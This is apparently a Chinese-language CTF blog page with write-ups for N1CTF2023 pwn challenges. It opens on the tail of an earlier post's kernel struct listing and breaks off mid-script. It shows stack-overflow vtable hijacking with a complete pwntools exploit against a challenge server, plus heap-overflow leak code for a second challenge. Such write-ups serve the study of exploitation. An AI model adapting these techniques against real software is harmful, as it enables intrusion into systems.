class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">	 * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">	 * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">	 * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">	 * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">	 * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">	 * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">	 * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">	 * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">	 * cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/28/N1CTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/28/N1CTF2023/" class="post-title-link" itemprop="url">N1CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-28 02:26:28" itemprop="dateCreated datePublished" datetime="2023-11-28T02:26:28+08:00">2023-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-29 11:42:46" itemprop="dateModified" datetime="2023-11-29T11:42:46+08:00">2023-11-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>48k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>44 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="n1canary"><a href="#n1canary" class="headerlink" title="n1canary"></a>n1canary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a.out: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), statically linked, BuildID[sha1]=c1041d9d57f3f4dc0ad3e3ebb251ea748a0832d8, <span class="keyword">for</span> GNU/Linux <span class="number">4.4</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出漏洞：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input something to pwn :)&quot;</span>);</span><br><span class="line">ProtectedBuffer&lt;<span class="number">64ul</span>&gt;::mut&lt;BOFApp::<span class="built_in">launch</span>(<span class="keyword">void</span>)::&#123;<span class="built_in">lambda</span>(<span class="keyword">char</span> *)#<span class="number">1</span>&#125;&gt;((__int64)v3, (__int64)&amp;v2);</span><br><span class="line"><span class="built_in">puts</span>(v3);</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">BOFApp::launch</span><span class="params">(<span class="keyword">void</span>)</span>::</span>&#123;<span class="built_in">lambda</span>(<span class="keyword">char</span> *)#<span class="number">1</span>&#125;::<span class="built_in"><span class="keyword">operator</span></span>()(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _isoc23_scanf((__int64)<span class="string">&quot;%[^\n]&quot;</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有后门函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序自定义了一个栈保护，使用 <code>sys_getrandom</code> 获取随机数生成 canary，这个 canary 几乎是不可能绕过的</p>
<p>程序使用了智能指针 <code>unique_ptr</code>，因此在当前语句块结束时会调用 BOFApp 的析构函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">std::make_unique&lt;BOFApp&gt;((__int64)v6);</span><br><span class="line">v4 = std::unique_ptr&lt;BOFApp&gt;::<span class="keyword">operator</span>-&gt;((__int64)v6);</span><br><span class="line">(*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(__int64))(*(_QWORD *)v4 + <span class="number">16LL</span>))(v4);</span><br><span class="line">std::unique_ptr&lt;BOFApp&gt;::~<span class="built_in">unique_ptr</span>((__int64)v6);</span><br></pre></td></tr></table></figure>
<p>并且 BOFApp 类本身具有虚函数，其虚表可以被我们覆盖：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffe4b0afa80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rdi <span class="number">0x7ffe4b0afa80</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓            <span class="number">7</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7ffe4b0afac0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7ffe4b0afac8</span> ◂— <span class="number">0xda64322f1f19d59</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7ffe4b0afad0</span> —▸ <span class="number">0x7ffe4b0afc28</span> —▸ <span class="number">0x7ffe4b0b02a6</span> ◂— <span class="string">&#x27;HTTP_PROXY=http://127.0.0.1:7890/&#x27;</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7ffe4b0afad8</span> ◂— <span class="number">0x7c3b282cea4eec00</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7ffe4b0afae0</span> —▸ <span class="number">0x7ffe4b0afc18</span> —▸ <span class="number">0x7ffe4b0b029e</span> ◂— <span class="number">0x74756f2e612f2e</span> <span class="comment">/* &#x27;./a.out&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7ffe4b0afae8</span> —▸ <span class="number">0x403407</span> (main+<span class="number">103</span>) ◂— mov    rax, rsp</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7ffe4b0afaf0</span> —▸ <span class="number">0x6b3730</span> —▸ <span class="number">0x4ed510</span> (__preinit_array_start+<span class="number">48</span>) —▸ <span class="number">0x40388c</span> (BOFApp::~<span class="built_in">BOFApp</span>()) ◂— sub    rsp, <span class="number">18</span>h</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x4ed510</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x4ed510</span> (__preinit_array_start+<span class="number">48</span>) —▸ <span class="number">0x40388c</span> (BOFApp::~<span class="built_in">BOFApp</span>()) ◂— sub    rsp, <span class="number">18</span>h</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x4ed518</span> (__preinit_array_start+<span class="number">56</span>) —▸ <span class="number">0x4038b8</span> (BOFApp::~<span class="built_in">BOFApp</span>()) ◂— sub    rsp, <span class="number">18</span>h</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x4ed520</span> (__preinit_array_start+<span class="number">64</span>) —▸ <span class="number">0x403552</span> (BOFApp::<span class="built_in">launch</span>()) ◂— sub    rsp, <span class="number">88</span>h</span><br></pre></td></tr></table></figure>
<p>核心思路就是覆盖虚表，使其执行后门函数</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./a.out&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x403909\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase()\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">vtable_addr = <span class="number">0x4F4AA0</span></span><br><span class="line">backdoor = <span class="number">0x403387</span></span><br><span class="line"></span><br><span class="line">vtable =  p64(vtable_addr)</span><br><span class="line">vtable += p64(backdoor)</span><br><span class="line">vtable =  vtable.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;canary&quot;</span>,vtable)</span><br><span class="line">sla(<span class="string">&quot;pwn :)&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x403407</span>)+p64(vtable_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="n1array"><a href="#n1array" class="headerlink" title="n1array"></a>n1array</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=bf9f13ff31aa3f4c4036ab8bf12e14f3abe0d287, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>程序分析</strong></p>
<p>程序维护了一个 hashTable，每个条目都是一个 Chunk 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Chunk struc ; (<span class="keyword">sizeof</span>=<span class="number">0x40</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span> nelts dd ?</span><br><span class="line"><span class="number">00000004</span> field_4 dd ?</span><br><span class="line"><span class="number">00000008</span> atom dq ?                               ; offset</span><br><span class="line"><span class="number">00000010</span> name_len dd ?</span><br><span class="line"><span class="number">00000014</span> field_14 dd ?</span><br><span class="line"><span class="number">00000018</span> name dq ?                               ; offset</span><br><span class="line"><span class="number">00000020</span> value2 dd ?</span><br><span class="line"><span class="number">00000024</span> value_nelts dd ?</span><br><span class="line"><span class="number">00000028</span> value dq ?                              ; offset</span><br><span class="line"><span class="number">00000030</span> type_nelts dd ?</span><br><span class="line"><span class="number">00000034</span> field_34 dd ?</span><br><span class="line"><span class="number">00000038</span> type_key dq ?                           ; offset</span><br><span class="line"><span class="number">00000040</span> Chunk ends</span><br></pre></td></tr></table></figure>
<p>其中记录了三种 Atom（name，type，value）：</p>
<ul>
<li>name：用于索引 hashTable</li>
<li>value：有两种模式</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a2-&gt;key )</span><br><span class="line">&#123;</span><br><span class="line">  chunk-&gt;value2 = a2-&gt;value2; <span class="comment">/* 使用value2(整个数组的数据为同一个值) */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="number">4</span> * chunk-&gt;value_nelts) + <span class="number">0x14</span> &gt; a2-&gt;len )</span><br><span class="line">    __assert_fail(<span class="string">&quot;array-&gt;value.nelts * 4 + sizeof(struct ValueAtom) &lt;= atom-&gt;len&quot;</span>, <span class="string">&quot;pwn.c&quot;</span>, <span class="number">0x8D</span>u, <span class="string">&quot;parseValueAtom&quot;</span>);</span><br><span class="line">  chunk-&gt;value = (<span class="keyword">int</span> *)&amp;a2-&gt;value; <span class="comment">/* 使用value数组(分别指定数组数据的每一个值) */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过逆向分析，得出三种 Atom 的输入格式如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">value_atom</span>(<span class="params">nelts, value:<span class="built_in">list</span>, key=<span class="number">0</span>, value2=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="comment"># len | type | key | value2 | nelts | value</span></span><br><span class="line">    value_data = <span class="string">b&quot;&quot;</span>.join([p32(i) <span class="keyword">for</span> i <span class="keyword">in</span> value])</span><br><span class="line">    tmp = p32(<span class="number">1</span>) + p32(key) + p32(value2) + p32(nelts) + value_data</span><br><span class="line">    tmp = p32(<span class="number">4</span> + <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_atom</span>(<span class="params">nelts, <span class="built_in">type</span>:<span class="built_in">list</span></span>):</span></span><br><span class="line">    <span class="comment"># len | type | nelts | type</span></span><br><span class="line">    type_data = <span class="string">b&quot;&quot;</span>.join([p8(t) <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">type</span>])</span><br><span class="line">    tmp = p32(<span class="number">2</span>) + p32(nelts) + type_data</span><br><span class="line">    tmp = p32(<span class="number">4</span> + <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name_atom</span>(<span class="params">name:<span class="built_in">bytes</span></span>):</span></span><br><span class="line">    <span class="comment"># len | type | name_len | name</span></span><br><span class="line">    tmp = p32(<span class="number">3</span>) + p32(<span class="built_in">len</span>(name)) + name</span><br><span class="line">    tmp = p32(<span class="number">4</span> + <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>该题目的漏洞点比较隐秘，其核心在于 <code>chunk-&gt;nelts</code> 可能被重复写入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;value_nelts = type-&gt;nelts;</span><br><span class="line"><span class="keyword">if</span> ( type-&gt;key )</span><br><span class="line">&#123;</span><br><span class="line">  chunk-&gt;value2 = type-&gt;value2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="number">4</span> * chunk-&gt;value_nelts) + <span class="number">0x14</span> &gt; type-&gt;len )</span><br><span class="line">    __assert_fail(<span class="string">&quot;array-&gt;value.nelts * 4 + sizeof(struct ValueAtom) &lt;= atom-&gt;len&quot;</span>, <span class="string">&quot;pwn.c&quot;</span>, <span class="number">0x8D</span>u, <span class="string">&quot;parseValueAtom&quot;</span>);</span><br><span class="line">  chunk-&gt;value = (<span class="keyword">int</span> *)&amp;type-&gt;value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们先写入一次 <code>chunk-&gt;value</code>，再写入更长的 <code>chunk-&gt;value2</code> 时就会触发这个漏洞，此时 <code>chunk-&gt;nelts</code> 会覆盖为 <code>chunk-&gt;value2</code> 的长度，但程序大部分功能仍然优先使用 <code>chunk-&gt;value</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1-&gt;value )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a1-&gt;nelts &gt; i; ++i )</span><br><span class="line">    printVal(a1-&gt;value[i], a1-&gt;type_key[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  value2 = a1-&gt;value2;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; a1-&gt;nelts &gt; j; ++j )</span><br><span class="line">    printVal(value2, a1-&gt;type_key[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就导致了堆溢出</p>
<p><strong>入侵思路</strong></p>
<p>先利用堆溢出泄露数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(b<span class="string">&quot;1111\x00&quot;</span>) + value_atom(<span class="number">1</span>, [<span class="number">0x1000</span>]*<span class="number">1</span>) + value_atom(<span class="number">0x100</span>, [<span class="number">0x1000</span>], <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">hash(payload)</span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(b<span class="string">&quot;2222\x00&quot;</span>) + value_atom(<span class="number">0x100</span>, [<span class="number">0x1000</span>]*<span class="number">0x100</span>)</span><br><span class="line">hash(payload)</span><br><span class="line"></span><br><span class="line">dele(b<span class="string">&quot;2222\x00&quot;</span>)</span><br><span class="line">show(b<span class="string">&quot;1111\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot; 0 0 1 2952790016 &quot;</span>)</span><br><span class="line">leak_addr1 = eval(ru(<span class="string">&quot; &quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr1 &gt;&gt; &quot;</span>+hex(leak_addr1))</span><br><span class="line">leak_addr2 = eval(ru(<span class="string">&quot; &quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr2 &gt;&gt; &quot;</span>+hex(leak_addr2))</span><br><span class="line"></span><br><span class="line">leak_addr = (leak_addr2 &amp; <span class="number">0xff</span>)*<span class="number">0x10000000000</span>+leak_addr1*<span class="number">0x100</span></span><br><span class="line">heap_base = leak_addr<span class="number">-0x300</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+hex(heap_base))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot; 5 3758096384 &quot;</span>)</span><br><span class="line">leak_addr1 = eval(ru(<span class="string">&quot; &quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr1 &gt;&gt; &quot;</span>+hex(leak_addr1))</span><br><span class="line">leak_addr = (<span class="number">0x7f</span> &amp; <span class="number">0xff</span>)*<span class="number">0x10000000000</span>+leak_addr1*<span 